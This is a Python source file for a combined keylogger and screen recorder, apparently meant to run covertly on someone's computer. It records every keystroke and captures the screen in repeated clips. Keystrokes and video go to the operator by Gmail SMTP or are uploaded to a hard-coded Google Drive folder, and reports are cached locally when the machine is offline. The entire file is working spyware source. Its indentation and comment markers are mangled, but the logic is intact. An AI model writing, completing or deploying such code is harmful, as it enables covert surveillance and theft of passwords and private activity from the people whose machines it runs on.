import os
import io
import time
import socket
import smtplib
import threading
import cv2
import numpy as np
import pyautogui
from pynput import keyboard
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload

---------- Config ----------#

EMAIL = "Your Email"
PASSWORD = "Your Password"
EMAIL_INTERVAL = 240  # 60 seconds
RECORD_DURATION = 240  # 60 seconds
MAX_ATTACHMENT_SIZE = 25 * 1024 * 1024  # 25MB
STORAGE_DIR = "pending_reports"
DRIVE_FOLDER_ID = "14OB0Sd7mwAWQGBgqxfOiz29O-uc9W7by"

SERVICE_ACCOUNT_FILE = 'service_account.json'
SCOPES = ['https://www.googleapis.com/auth/drive']

log = ""
os.makedirs(STORAGE_DIR, exist_ok=True)

---------- Helper Functions ----------

def is_online():
try:
socket.create_connection(("8.8.8.8", 53), timeout=2)
return True
except OSError:
return False

def upload_to_drive(file_path):
try:
creds = service_account.Credentials.from_service_account_file(
SERVICE_ACCOUNT_FILE, scopes=SCOPES)
service = build('drive', 'v3', credentials=creds)

file_name = os.path.basename(file_path)
file_metadata = {'name': file_name}
if DRIVE_FOLDER_ID:
file_metadata['parents'] = [DRIVE_FOLDER_ID]

media = MediaIoBaseUpload(        
    io.FileIO(file_path, 'rb'),        
    mimetype='video/mp4',        
    resumable=True        
)        

file = service.files().create(        
    body=file_metadata,        
    media_body=media,        
    fields='id,webViewLink'        
).execute()        

print(f"[+] Uploaded to Drive: {file.get('webViewLink')}")        
return file.get('webViewLink')

except Exception as e:
print(f"[!] Drive upload failed: {e}")
return None

def send_email(log_data="", video_path=None):
msg = MIMEMultipart()
msg['From'] = EMAIL
msg['To'] = EMAIL
msg['Subject'] = "Screen Record Report"

body = log_data or "[No keys pressed]"

if video_path and os.path.exists(video_path):
file_size = os.path.getsize(video_path)
if file_size > MAX_ATTACHMENT_SIZE:
drive_link = upload_to_drive(video_path)
if drive_link:
body += f"\n\nVideo (Too large for email): {drive_link}"
else:
body += "\n\n[Video upload failed]"
else:
with open(video_path, 'rb') as f:
part = MIMEBase('application', 'octet-stream')
part.set_payload(f.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',
f'attachment; filename="{os.path.basename(video_path)}"')
msg.attach(part)

msg.attach(MIMEText(body, 'plain'))

try:
with smtplib.SMTP("smtp.gmail.com", 587) as server:
server.starttls()
server.login(EMAIL, PASSWORD)
server.send_message(msg)
print("[+] Email sent successfully.")
return True
except Exception as e:
print(f"[!] Email failed: {e}")
return False

def record_screen():
try:
print("[+] Starting screen recording...")
width, height = pyautogui.size()
fourcc = cv2.VideoWriter_fourcc(*"mp4v")
output_file = f"record_{int(time.time())}.mp4"
out = cv2.VideoWriter(output_file, fourcc, 8.0, (width, height))
start_time = time.time()

while True:
img = pyautogui.screenshot()
frame = np.array(img)
frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
out.write(frame)

if time.time() - start_time > RECORD_DURATION:        
        break        

out.release()        
print(f"[+] Recording saved: {output_file}")        
return output_file

except Exception as e:
print(f"[!] Screen recording failed: {e}")
return None

def on_press(key):
global log
try:
log += key.char
except AttributeError:
log += f"[{key.name}]"

def report():
global log
print("[*] Starting new report cycle...")
video_path = record_screen()
email_sent = False

if is_online():
print("[*] Internet connected. Sending email...")
email_sent = send_email(log, video_path)
else:
print("[!] No internet. Saving locally...")

if not email_sent:
timestamp = int(time.time())
report_dir = os.path.join(STORAGE_DIR, f"report_{timestamp}")
os.makedirs(report_dir, exist_ok=True)

with open(os.path.join(report_dir, "keys.txt"), "w") as f:        
    f.write(log)        

if video_path:        
    os.rename(video_path, os.path.join(report_dir, "recording.mp4"))        
print(f"[+] Saved locally at {report_dir}")

log = ""

def start_loop():
while True:
start_time = time.time()
report()
elapsed = time.time() - start_time
sleep_time = max(0, EMAIL_INTERVAL - elapsed)
time.sleep(sleep_time)

---------- Start ----------

print("[*] Starting Keylogger and Screen Recorder...")
listener = keyboard.Listener(on_press=on_press)
listener.start()
start_loop()
